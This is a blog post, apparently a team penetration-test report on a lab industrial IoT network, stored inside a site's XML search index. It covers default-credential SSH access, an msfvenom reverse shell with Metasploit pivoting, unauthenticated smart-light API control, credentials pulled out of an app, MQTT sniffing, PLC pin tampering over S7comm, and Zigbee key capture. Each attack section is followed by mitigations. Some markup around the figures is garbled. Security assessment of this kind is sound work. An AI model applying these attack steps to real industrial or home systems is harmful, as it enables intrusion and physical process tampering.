<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Penetration testing in industrial IOT environment</title>
    <link href="/2025/07/05/Penetration-testing-in-IOT-environment/"/>
    <url>/2025/07/05/Penetration-testing-in-IOT-environment/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This report aims to explore and identify vulnerabilities within the network environment through penetration testing techniques. We conducted service discovery, targeted attacks on security risks unique to different devices, employing a variety of technical methods including traffic proxy technology, using jump machines to access the internal network, reverse engineering to analyze device configurations, sniffing network traffic, key cracking, and unauthorized vulnerability exploitation. We documented and analyzed the issues discovered to illustrate the real-world impact of security vulnerabilities in industrial and connected devices. The report was collaboratively completed by our team, with me primarily responsible for the penetration testing portion, while other members contributed to part of the penetration testing and report writing.</p><h1 id="Asset-Inventory"><a href="#Asset-Inventory" class="headerlink" title="Asset Inventory"></a>Asset Inventory</h1><h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>The first step to access the IoT devices subnet, is to setup one kalivirtual machine and connect to the access point in 192.168.88.1. Thekali bridge connects to the windows host and manually points to thewireless network interface.</p><h2 id="Identifying-Active-Hosts"><a href="#Identifying-Active-Hosts" class="headerlink" title="Identifying Active Hosts"></a>Identifying Active Hosts</h2><p>Using nmap scan the active host in subnet 192.168.88.0&#x2F;24 with followingcommand.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -PR -sn <span class="hljs-number">192.168.88.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image1.png" class=""><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image2.png" class=""><p>Figure 1: nmap discovery active host</p><p>Figure 1 illustrates the scan results, including some wirelesslyconnected attacker devices (Windows and Kali) within the subnet, whichwill be excluded from following service analysis after checking.</p><h2 id="Service-Discovery"><a href="#Service-Discovery" class="headerlink" title="Service Discovery"></a>Service Discovery</h2><p>Based on the host addresses identified in Section 2.2, the next stepinvolves enumerate services running on each host. The [-A]option of <em>nmap</em> is utilized for aggressive scanning, including OSdetection, version detection, traceroute, etc.; the [-sV]option enables service version detection, and [-p-] optionidentifies all available ports. The result for important host is shownin Figure 2, Figure 3, Figure 4.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image3.jpg" class=""><p>Figure 2: Scanning result of host 192.168.88.254, which is recognized asthe Philip desk lamp.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image4.jpg" class=""><p>Figure 3: Scanning result of host 192.168.88.188, shown as Philips Hue.</p><p>In Figure 4, the identified services are totally same for the192.168.88.50 (left) and 192.168.88.189 (right). At the Section 3.2, itshows two Ip addresses is occupied by one machine.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image6.jpg" class=""><p>Figure 4: Scanning result of 192.168.88.50 &amp; 192.168.88.189, which lookssimilar that running same services.</p><p>The tables below provide a complete inventory of all active devicesidentified on two distinct network segments during the reconnaissancephase. Table 1 summarizes assets discovered on the primary managementsubnet (192.168.88.0&#x2F;24) via an Nmap ping sweep, listing each host’s IPaddress, open ports, and running services. This baseline inventoryestablishes visibility into core infrastructure components and informssubsequent vulnerability analysis.</p><p>Table 1: Active services in subnet 192.168.88.0&#x2F;24.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/table1.png" class=""><img src="/2025/07/05/Penetration-testing-in-IOT-environment/table1-1.png" class=""><p>Table 2 captures assets on the secondary plant subnet([192.168.2.0&#x2F;24]), discovered by pivoting through thecompromised host at [192.168.88.186]. It follows the sameformat—IP, MAC&#x2F;vendor, exposed ports, and service details—to enablea consistent comparison of risk across both network segments and supportprioritized remediation planning.</p><p>Table 2: Active services in subnet 192.168.2.0&#x2F;24</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/table2.png" class=""><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image7.png" class=""><p>Figure 5: Network and communication structure in System</p><p>The above Figure 5 shows the network and communication structure in thewhole system that we analyze. The Simems 2050 is the key device thatconnects to subnet (192.168.88.0&#x2F;24 and 192.168.2.0&#x2F;24), which isrunning the Mosquitto broker service, receiving MQTTT messages fromZigbee receiver who collects meter values from sensor. Besides, Simems2050 is also running Node-RED, which collects information from ICSdevices (PLC and HMI) and sensor values. These values will be sent toSCADA Monitor, showing on the panel. Additionally, there are many homessmart devices, which connect to hubs using Zigbee protocol. Users canuse the phone connecting to cloud server on the internet to sendcommands to and get responses from the hubs to control these devices(Light, button and sensor).</p><p>The Nmap scan identified port 5000 on host 192.168.88.150 running a webinterface via upnp protocol in Figure 6, enabling direct browser accessto the Smart Plant Monitoring system, revealing connected PLC and HMIdevices and real-time operational status.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image8.png" class=""><p>Figure 6: Simulate SCADA monitor web page in Ubuntu 192.168.88.150.</p><p>Access to port 2050 on 192.168.88.50 requires no credentials shown inFigure 7 — the AV Embedded Configuration interface is exposed andpermits full administrative control without login.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image9.png" class=""><p>Figure 7: SIEMENS SIMATIC IoT2050 control panel in host192.168.88.50:2050.</p><p>In Figure 8, the Node-RED interface on 192.168.88.189:1880 is accessiblewithout authentication and reveals active logic flows for processingsensor data such as temperature, humidity, and conveyor status throughHTTP requests.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image10.png" class=""><p>Figure 8: Red-node web page in host 192.168.88.189:1880, shows theconnection logic of IoT devices. Which is also available in host192.168.88.50:1880.</p><p>Schematic diagram for accessing 192.168.2.10 and viewing the status andconfiguration information of Siemens S7-1200 station_2 | PLC_1 via aweb browser.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image11.png" class=""><p>Figure 9: Web‑based management interface of the Siemens SIMATIC S7‑1200PLC (CPU 1212C) reachable at [<a href="https://192.168.2.10/Portal]">https://192.168.2.10/Portal]</a></p><h1 id="Survey-of-Plant-Monitoring-System"><a href="#Survey-of-Plant-Monitoring-System" class="headerlink" title="Survey of Plant Monitoring System"></a>Survey of Plant Monitoring System</h1><h2 id="Access-Point-Default-Password-Weak-Access-Control-Main-Victim-192-168-88-1"><a href="#Access-Point-Default-Password-Weak-Access-Control-Main-Victim-192-168-88-1" class="headerlink" title="Access Point Default Password &amp; Weak Access Control (Main Victim: 192.168.88.1)"></a>Access Point Default Password &amp; Weak Access Control (Main Victim: 192.168.88.1)</h2><p>An unauthenticated access vulnerability was identified in the RouterOSweb interface at [192.168.88.1], which exposes the fullswitch configuration menu, allowing an attacker to modify core networkinfrastructure without valid credentials, shown in<img src="/2025/07/05/Penetration-testing-in-IOT-environment/image12.png" class=""></p><p>Figure 10.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image12.png" class=""><p>Figure 10: Unauthenticated access to the RouterOS web interfaceat [192.168.88.1]</p><p>This is a typical misconfiguration issue; leaving critical networkinfrastructure such as access points and routers without passwords orprotected by weak credentials represents a significant security risk.This vulnerability includes multiple threat categories, including<strong>Tampering</strong>, <strong>Repudiation</strong>, and <strong>Information Disclosure</strong>.</p><h3 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>This issue can be significantly mitigated through stricter credentialmanagement mechanisms, such as enforcing strong passwords andimplementing multi-factor authentication (MFA). Additionally,controlling access via trusted IP allowlists, maintaining comprehensiveaccess logs, and regularly updating firmware and software are effectivemeasures to reduce risks associated with misconfigurations.</p><h2 id="Default-Password-Pair-Reverse-Shell-Establishment-Main-Victim-192-168-88-50"><a href="#Default-Password-Pair-Reverse-Shell-Establishment-Main-Victim-192-168-88-50" class="headerlink" title="Default Password Pair &amp; Reverse Shell Establishment (Main Victim: 192.168.88.50)"></a>Default Password Pair &amp; Reverse Shell Establishment (Main Victim: 192.168.88.50)</h2><p>In this section, the attacker remotely ssh connected to the SiemensIoT2050 device ([192.168.88.50]) using default credentialsand executed a trojanized program. Next, a listener was configured onthe Kali machine, along with auto routing and proxy services, therebyestablishing a reverse shell and a proxy server to achieve remote codeexecution (RCE) on the victim machine. Finally, Kali exploited<em>proxychains</em> to connect through the established proxy, enabling accessto the target network segment (192.168.2.0&#x2F;24).</p><h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>The host at [192.168.88.50] (Siemens IoT2050) was identifiedto be using default credentials, allowing SSH connection via the knowndefault password, shown in Figure 11.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image13.png" class=""><p>Figure 11: Remote connection to Siemens IoT2050 by SSH and defaultusername password pair.</p><p>To facilitate pivoting into the secondary network [192.168.2.0&#x2F;24)], a payload was generated by*[msfvenom]*<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[https://www.kali.org/tools/metasploit-framework/#msfvenom](https://www.kali.org/tools/metasploit-framework/%23msfvenom)">[1]</span></a></sup> to establish shell access on the targethost shown in Figure 12. By this step, one reverse shell is obtained forfollowing exploitation.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image14.png" class=""><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image15.png" class=""><p>Figure 12: Payload generation and transfer to remote host(192.168.88.50) by <em>scp</em> command. The upper image used for payloadgeneration, while lower image transfer the payload by scp with anestablished ssh channel.</p><p>After the payload subsequently uploaded, and necessary privilegeescalation was performed to gain full access in Figure 13, otherwise thepayload would have no permission to run in victim machine.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image16.png" class=""><p>Figure 13: <strong>Elevation of privilege</strong> to payload, allowed payloadrunning in target system.</p><p>Then, Metasploit framework (MSF) was used to establish a listener,configure routing, and set up a proxy to facilitate further networkaccess.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image17.png" class=""><p>Figure 14: The reverse TCP listener configuration involves three primarysteps: 1. initializing the handler with the specified local address andport, 2. configuring autorouting, and 3. finally launching a SOCKS proxyserver.</p><p>After successfully obtaining shell access to the host in Figure 15, inFigure 16, utilizing the system command to analyze the networkcommunication in victim, while another network segment was identifiedin.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image19.png" class=""><p>Figure 15 Launching Metasploit framework and setting up a Reverse TCPListener using an remote control(RC) Script.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image21.png" class=""><p>Figure 16: Network interface information leaking. The upper imageillustrates the result of <em>[sysinfo]</em> command execution. Andthe secondary subnet [192.168.2.0&#x2F;24] found in interface 3at lower image.</p><p>By configuring a local proxy running at [127.0.0.1:8080]through editing [proxychains.conf] in Figure 17 left image,nmap scans were conducted on this new segment in Figure 17 right image,revealing active hosts: [192.168.2.9],[192.168.2.10], and [192.168.2.130 (found in furtherscanning)].</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image22.png" class=""><p>Figure 17: By fixing the proxy config in[&#x2F;etc&#x2F;proxychains.conf] like left image, successfullyexecute nmap command in [192.168.2.0&#x2F;24] subnet byproxychains.</p><p>After connecting to [192.168.88.189] using ssh, it’s easy tosee that [192.168.88.50&#x2F;24] and[192.168.88.189&#x2F;24] are both under eno2.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image24.png" class=""><p>Figure 18: Remote connection to 192.168.88.189. By using command ip a,represents that 192.168.88.50 and 192.168.88.189 is the one machine withdifferent ip address.</p><h3 id="Mitigations-1"><a href="#Mitigations-1" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>Trojan implantation and reverse shell exploitation constitute highlycritical attack vectors. Exploiting RCE vulnerabilities enablesattackers to seize device control, embed hidden backdoors [5], andbotnets [1], among other malicious objectives. Such attacks implicateall six dimensions within the STRIDE threat analysis model.</p><p>To mitigate risks highlighted, implementing strong authenticationmethods such as key-based SSH authentication instead of passwords canreduce unauthorized access risks. Proper authorization rules must beenforced to limit user privileges strictly according to their roles.Secondly, unnecessary services and open ports that might disclosesensitive network information should be disabled or hidden to minimizepotential attack surfaces. Additionally, configuring firewall rules toallow only necessary connections and conducting regular software updatescan protect the system from known vulnerabilities, thus significantlyreducing risks of unauthorized access and information disclosure.Moreover, monitoring and alerting suspicious processes and networkconnections through Intrusion Detection Systems (IDS) will also play arole for defense malicious program operation.</p><h2 id="Unauthorized-RESTful-API-allows-Spoofing-of-the-desk-lamp-signal-Victim-192-168-88-188"><a href="#Unauthorized-RESTful-API-allows-Spoofing-of-the-desk-lamp-signal-Victim-192-168-88-188" class="headerlink" title="Unauthorized RESTful API allows Spoofing of the desk lamp signal (Victim: 192.168.88.188)"></a>Unauthorized RESTful API allows Spoofing of the desk lamp signal (Victim: 192.168.88.188)</h2><h3 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>A debugger page was accessible at<a href="http://192.168.88.188/debug/clip.html">http://192.168.88.188/debug/clip.html</a>, so 192.168.88.188 wasidentified as an unauthenticated interface capable of controlling thesmart light in the left image of Figure 19. Activating the “Hug” buttonissued a request to the &#x2F;api endpoint shown in the right image of Figure19, which returned the session token:</p><p>mJmYjtqYzB4GpX6LewQ6bN067pnxetiVatbO0lVc</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image26.png" class=""><p>Figure 19 The left image shows the website page of CLIP API Debugger on[192.168.88.188;\the right image is] using the CLIP API Debugger interface tosend HTTP requests</p><p>Querying URL path &#x2F;api&#x2F;mJmYjtqYzB4GpX6LewQ6bN067pnxetiVatbO0lVc&#x2F;revealed a light identifier of ‘1’, which is the light object responsewith detail status information from server.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image27.png" class=""><p>Figure 20 Retrieving device state information via the CLIP API Debugger</p><p>After that, a GET request to this resource confirmed the current stateof the light, and sending a PUT request to the same endpointsuccessfully updated its state to “on”, while the physical lamp alsoturned on.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image28.png" class=""><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image29.png" class=""><p>Figure 21: Clip API request attack.</p><h3 id="Mitigations-2"><a href="#Mitigations-2" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>It was found that unauthorized users could access the RESTful APIinterface and remotely control the smart lighting due to the lack ofproper authentication mechanisms. Therefore, it’s critical to implementrobust authentication and authorization practices, such as deployingsecure API keys, OAuth tokens, or JSON Web Tokens (JWT). These methodsensure that only authorized entities can access sensitive API endpoints,effectively preventing unauthorized remote control of the lightingsystem as observed during our hands-on assessment.</p><p>Additionally, utilizing HTTPS instead of HTTP ensures that requestsremain encrypted during transmission, thereby mitigating the risk ofcredentials being intercepted by unauthorized third parties [7].Furthermore, restricting access to administrative functions throughtrusted device allowlists can further enhance the security posture.</p><h2 id="Reverse-Engineer-Find-Camera-Password-Main-Victim-192-168-88-20"><a href="#Reverse-Engineer-Find-Camera-Password-Main-Victim-192-168-88-20" class="headerlink" title="Reverse Engineer Find Camera Password (Main Victim: 192.168.88.20)"></a>Reverse Engineer Find Camera Password (Main Victim: 192.168.88.20)</h2><p>In this section, reverse engineering is used to decompile and analyzethe target APK package to extract sensitive information (e.g., usernamesand passwords) embedded in the software. Not only was the applicationsuccessfully executed using an Android emulator, but an unauthenticatedwebcam service interface was also discovered. It also discoveredusernames and passwords of administrators and regular users fromconfiguration files and APK package files respectively and successfullyaccessed the protected service from the web side.</p><h3 id="Exploitation-2"><a href="#Exploitation-2" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>Firstly, find the camera tag and port from the imported APK packagewithin Jadx.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image30.png" class=""><p>Figure 22: Application name and label in AndroidManifest.xml file,extract from apk package by jadx<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="Java decompiler tool, ">[2]</span></a></sup>.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image31.png" class=""><p>Figure 23: Discovery the camera service port (8765 or 8081) by keywordsearching.</p><p>Figure 24 (left) shows the using of Android Studio and set the config ofcamera and retrieved credentials: URL(<a href="http://192.168.88.20/">http://192.168.88.20</a>), label(PlantEye), port(8765), ensuring a successful connection to the camera feed.After the setup, a live feed can be viewed from the Raspberry Pi camerain Figure 24 (right).</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image33.png" class=""><p>Figure 24 Configuring and accessing a Raspberry Pi-based motionEyecamera via a mobile app</p><p>Regarding the connection to the web side, this can be done by firstconnecting to [192.168.88.20] using ssh with the defaultpassword in Figure 25.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image34.png" class=""><p>Figure 25 Locating and identifying potentially sensitive configurationfiles within a Raspberry Pi camera system</p><p>Once this process has gained permission, it is possible to locate theMotionEye configuration file and look for the administrator username andpassword directly from the relevant file.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image35.png" class=""><p>Figure 26: Ending the motion.conf configuration file and revealing admincredentials</p><p>Fill in the admin_username and admin_password in the browser login boxto successfully access the camera web interface.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image36.png" class=""><p>Figure 27 Logging into the Raspberry Pi camera web interface withadmin’s retrieved credentials</p><p>By using the Jadx software again, the app_debug.apk file was importedand the lookup keyword was set to the default username. As a result, thestrings.xml file of the Android application exposes the hard-codeddefault username (‘user’) and password (‘GoPr0NoGo.1337’).</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image37.png" class=""><p>Figure 28 Identifying hardcoded default credentials in an Android app’sresource file</p><p>Using the discovered credentials, the user successfully logs into a webinterface streaming from a Raspberry Pi camera.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image38.png" class=""><p>Figure 29 Logging into the Raspberry Pi camera web interface with user’sretrieved credentials</p><h3 id="Mitigations-3"><a href="#Mitigations-3" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>To mitigate the risk identified, particularly the exposure of camerapasswords through reverse engineering of the application, more targetedsecurity practices should be applied. Specifically, sensitiveinformation such as login credentials and device access passwords shouldnever be hard-coded or plainly embedded within application binaries.Instead, these sensitive details should always be securely encrypted andstored in dedicated secure storage spaces.</p><p>Additionally, employing advanced obfuscation methods such as controlflow flattening, identifier renaming, and string encryption will obscurethe logical structure of the app, making it difficult and time-consumingfor potential attackers to locate and extract sensitive information. Andregular security assessments and updating the application’s obfuscationtechniques can consistently counter evolving reverse engineeringmethods, further protecting the system from unauthorized dataextraction.</p><p>Strengthening overall communication security is also critical.Implementing secure and encrypted protocols such as HTTPS withappropriate TLS certificates ensures that sensitive data transmittedbetween the application and its backend cannot be intercepted ortampered with during transit.</p><h2 id="Mosquitto-Sniffing-Victim-192-168-88-150"><a href="#Mosquitto-Sniffing-Victim-192-168-88-150" class="headerlink" title="Mosquitto Sniffing (Victim: 192.168.88.150)"></a>Mosquitto Sniffing (Victim: 192.168.88.150)</h2><h3 id="Exploitation-3"><a href="#Exploitation-3" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>After connecting to 192.168.88.150 by SSH, it demonstrates the runningMosquitto broker process on the device (iot2050-debian) and a client.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image39.png" class=""><p>Figure 30 Checking running Mosquitto broker processes on the IoT2050host reveals an active MQTT subscription command, showing configurationdetails and topic subscriptions</p><p>In Figure 31, it uses the netstat -tupln command to check the servicesthat are running and listening for connections on the server.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image40.png" class=""><p>Figure 31 Checking active listening services, and result shows a varietyof ports and protocols, confirming that the Python-based service islistening on port 5000</p><p>Figure 32 displays the results from checking Mosquitto configurationfiles, identifying two active configuration files: one localconfiguration and one system-wide configuration.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image41.png" class=""><p>Figure 32 Results of checking Mosquitto configurations on the device</p><p>The contents of the system-wide Mosquitto configuration file show thepersistence setting and its designated location for storing persistentdata.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image42.png" class=""><p>Figure 33 Viewing contents of the Mosquitto system configuration file</p><p>The configuration file reveals that anonymous access is permitted onport 1883, indicating that any client can subscribe to or publishmessages without authentication.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image43.png" class=""><p>Figure 34 Local Mosquitto configuration permitting anonymous access</p><p>A Python MQTT client, hosted on IP 192.168.88.143, subscribes to allavailable MQTT topics.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image44.png" class=""><p>Figure 35 MQTT client at 192.168.88.143 subscribing to all MQTT topicsfrom the Mosquitto broker</p><p>Here it checks all the messages, indicating active connections andclient communications involving devices between 192.168.2.130 and192.168.2.50.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image46.png" class=""><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image47.png" class=""><p>Figure 36 Analysis of Mosquitto broker logs</p><p>Figure 37 illustrates a Node-RED instance on 192.168.88.50, subscribingto the MQTT topic ip, verifying that device 192.168.2.130 operates as aZigBeeReceiver.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image48.png" class=""><p>Figure 37 Node-RED instance (192.168.88.50)</p><h3 id="Mitigations-4"><a href="#Mitigations-4" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>Based on the observations and analysis from the practical experiment,the primary security issue arises from Mosquitto’s current configurationpermitting anonymous access on port 1883. This allows any device withinthe network, including unauthorized entities, to connect, subscribe, andpublish messages freely. To address this specific vulnerability,Mosquitto’s configuration must be modified to disable anonymous accessexplicitly. Implementing mandatory username and password authenticationthrough encrypted credential storage or external authentication serviceswould restrict broker access exclusively to authorized and verifieddevices.</p><p>Moreover, considering the nature of the practical operations,implementing secure communication channels is essential. Enabling TLSprovides robust encryption for messages exchanged between Mosquittobrokers and clients, ensuring confidentiality and integrity duringtransmission. And practical security enhancement also requires clearlydefined Access Control Lists (ACLs). Based on the report, it shouldexplicitly specify permissions for different clients, determining whichtopics they can publish or subscribe to. By enforcing strict topic-basedaccess policies tailored to industrial IoT environment, it could reducethe attack surface, limiting the risk of unauthorized access ormalicious control over the system.</p><h2 id="S7comm-Protocol-Non-authentication-Main-Victim-192-168-2-10"><a href="#S7comm-Protocol-Non-authentication-Main-Victim-192-168-2-10" class="headerlink" title="S7comm Protocol Non-authentication (Main Victim: 192.168.2.10)"></a>S7comm Protocol Non-authentication (Main Victim: 192.168.2.10)</h2><p>The [192.168.2.10] (Siemens PLC) communicates with other IoTdevices through S7comm protocol, which has been reported to containvulnerabilities that leak authentication mechanisms [2, 4]. Thissection leverages the identified vulnerability in the <em>S7Comm</em> protocolto handle a <strong>spoofing attack</strong> against the PLC. Based on the previouslyobtained reverse shell access to the host at [192.168.88.50](Siemens IoT2050), memory reading operations are performed on the victimto capture real-time states and analyze pin functionalities.Subsequently, a script continuously transmits crafted signals tospecific pins, overwriting legitimate signal content to achieve theintended spoofing effect.</p><h3 id="Exploitation-4"><a href="#Exploitation-4" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>Since the reverse shell of [192.168.88.50] was obtained inSection 3.2, the attacker can read the PLC output signal through thescript shown in Figure 38. This script establishes a connection to thePLC, reads one byte from Q (Output) pin memory at address 0, and printsthe state of the specified bit ([%Q0.2],[%Q0.3]).</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image49.png" class=""><p>Figure 38 Python script using the Snap7 library to connect to theSiemens S7‑1200 PLC at [192.168.2.10] and read the Booleanvalue of bit 3 in the Q output memory area.</p><p>It runs through <em>proxychains</em>, indicating that remote memory reads canbe performed through the pivot network path without direct networkaccess (Figure 39).</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image50.png" class=""><p>Figure 39: Proxychains output confirming that the same Snap7 readoperation ([%Q0.2] in left, %[Q0.3] in right)successfully executed.</p><p>Experimental testing confirmed that pin [%I10.2], designatedas an input pin, could be successfully written to and read with thetampered value. The following reading loop script in Figure 40 wasutilized to retrieve the value from pin [%I10.2], while theresult of reading pin [%I10.2] is <em>True</em>, shown in Figure41.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image52.png" class=""><p>Figure 40: The reading loop scripts, using python snap7 library.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image53.png" class=""><p>Figure 41: The terminal result of reading [%I10.2] pin withthe proxy connection.</p><p>Figure 42 shows write script, which rewrite it to <em>false</em> in[%I10.2] at Siemens PLC([192.168.2.10)].</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image54.png" class=""><p>Figure 42: Rewrite python script to PLC. Tampering the true value in%I10.2 to false.</p><p>After executing write script, it can be observed that value wassuccessfully changed in Figure 43, the spoofing completed.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image55.png" class=""><p>Figure 43: Result changed in %I10.2 pin was observed.</p><h3 id="Mitigations-5"><a href="#Mitigations-5" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>By implementing network segmentation, the PLC can be physically orlogically isolated from untrusted networks. Access control should beenforced based on the principle of least privilege, limiting access to apredefined list of authorized devices and operations. This approachsignificantly enhances PLC security by preventing unauthorizedinteractions. However, in the current scenario, a device connected tothe PLC has been compromised and repurposed as a proxy server, enablingindirect access for the attacker. To address such threats, deploying anIntrusion Detection System (IDS) within the internal network isrecommended to monitor and identify suspicious activities—such ashigh-frequency write operations—and trigger alerts accordingly.Additionally, protocol encapsulation techniques may be employed to wrapthe S7Comm protocol with enhanced security features.</p><h2 id="Zigbee-Key-Capture"><a href="#Zigbee-Key-Capture" class="headerlink" title="Zigbee Key Capture"></a>Zigbee Key Capture</h2><p>​Zigbee, as the communication protocol between Philips Lamp, Hue andSmart button, has known security vulnerabilities, particularlyconcerning its key management during the device joining process [3,6]. This Section exploit this vulnerability to archive the<strong>information disclosure</strong>.</p><h3 id="Exploitation-5"><a href="#Exploitation-5" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>Firstly, connect the Zigbee sniffer device to a Kali Linux machine fornetwork vulnerability testing.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image56.jpeg" class="" title="} Figure 44: Zigbee sniffer device connected to Kali Linux. Figure 45 shows the process of capturing ZigBee traffic using Wiresharkwith the help of Whsniff&lt;sup id&#x3D;fnref:3 class&#x3D;footnote-ref&gt;&lt;a href&#x3D;#fn:3 rel&#x3D;footnote&gt;&lt;span class&#x3D;hint--top hint--rounded aria-label&#x3D;&gt;[3]&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;. Under Edit -\&gt; Preferences -\&gt; Protocols-\&gt; ZigBee in Wireshark, a default key is added to decrypt the capturedZigBee packets. {% asset_img image57.png"><p>Figure 45 Capturing ZigBee traffic with Whsniff and Wireshark</p><p>Then try re-searching for light on the phone and pairing it and place itinside the kitchen instead of the original living room.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image59.png" class="image58.jpeg} Figure 46 Place light in the living room Using Wireshark again to capture the re-matched handshake packets, focuson the announcement keyword and extract the key field to findsecurity-related information. Key field: f9:09:e2:01:5f:d3:38:98:1c:e6:4e:8d:97:f1:5e:32 {% asset_img"><p>Figure 47 Captured ZigBee handshake packet with the “announcement”keyword, showing the extracted key field for security analysis</p><p>Next, continue to operate the APP to switch on and off the light severaltimes, and re-capture the packet, the result shows the packetinformation without adding the key. It can be observed that while somedata packets are transmitted after the “command” field, such as packetnumbers 434 and 435, the actual data remains undetectable.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image60.png" class=""><p>Figure 48 Captured packets transmitted without adding a key, but dataundetectable</p><p>Add a pre-configured ZigBee network key to Wireshark’s preferences todecrypt captured ZigBee packets , allowing for clearer analysis of thenetwork traffic.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image61.png" class=""><p>Figure 49 Adding the pre-configured ZigBee network key in Wireshark</p><p>It can be noted that the previously encrypted ZigBee packet has beensuccessfully decrypted, and the payload can be analysed. The decryptedpayload is now visible under the “Encrypted Payload” section in theWireshark interface.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image62.png" class=""><p>Figure 50 Decrypted ZigBee data packets, with the payload now visiblefor analysis</p><h3 id="Mitigations-6"><a href="#Mitigations-6" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>The experiment showed that ZigBee encryption keys could be easilyextracted from handshake packets, which directly threatens theconfidentiality of communications. To reduce this risk, static keysshould be avoided, as they can be reused across multiple devices andeasily intercepted. Instead, secure installation procedures should beenforced, including the use of Install Codes, which allow each ZigBeedevice to be paired with a unique, pre-distributed key. This methodensures that even if one pairing session is compromised, other devicesremain secure.</p><p>Regular key rotation and disabling insecure open join modes are alsonecessary to prevent long-term exploitation of exposed keys. Wherepossible, upgrading devices to ZigBee 3.0 or newer provides bettersecurity mechanisms, though this may not always be feasible due tohardware constraints. Access to the ZigBee network should be physicallyand logically restricted. Continued monitoring of ZigBee traffic,combined with detection systems that flag unusual device behavior,offers another important layer of protection against unauthorized accessattempts.</p><h2 id="Scada-Panel-Tampering"><a href="#Scada-Panel-Tampering" class="headerlink" title="Scada Panel Tampering"></a>Scada Panel Tampering</h2><p>The NODE-RED interface on IP [192.168.88.50] serves toprogram and control the SCADA system (192.168.88.150) through the WebUI.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image64.png" class=""><p>Figure 51 NODE-RED interface displaying the connection between ICSdevices and the SCADA server, and receiving messages from the PLC at192.168.2.10.</p><p>Figure 51 shows a configuration in Node-RED, where an HTTP request issent to the SCADA system at IP 192.168.88.150:5000, using the GET methodto send a message with the parameter “var_5_title&#x3D;Conveyor”.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image66.png" class=""><p>Figure 52 Sending a message to the SCADA system at 192.168.88.150:5000using an HTTP GET 